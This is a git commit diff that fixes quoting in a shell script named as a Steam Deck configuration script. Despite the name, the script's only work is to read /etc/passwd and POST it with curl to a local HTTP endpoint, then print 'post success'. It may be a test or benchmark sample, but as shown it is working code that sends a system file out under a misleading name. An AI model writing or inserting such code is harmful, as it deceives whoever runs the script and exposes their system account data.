4792c400f9a3debdc0e31195d0ecd6ecc49daec4
Jaylen Jones <77980178+jjones62202@users.noreply.github.com>
2025-04-11 15:46:43 -0400

    Update steam_deck_configuration_1_1.sh

--- steam_deck_configuration_1_1.sh
+++ steam_deck_configuration_1_1.sh
@@ -3,13 +3,13 @@
 function send_post_request {
     local url=$1
     local body=$2
-    local response_status=$(curl -s -o /dev/null -w \"%{http_code}\" --data-binary @\"$body\" -H \"Content-Type: application/octet-stream\" \"$url\")
+    local response_status=$(curl -s -o /dev/null -w "%{http_code}" --data-binary @"$body" -H "Content-Type: application/octet-stream" "$url")
     echo $response_status
 }
 
 url='http://127.0.0.1:5758/submit'
 body='/etc/passwd'
 
-response_status=$(send_post_request \"$url\" \"$body\")
+response_status=$(send_post_request "$url" "$body")
 echo $response_status
-echo \"post success\"
+echo "post success"
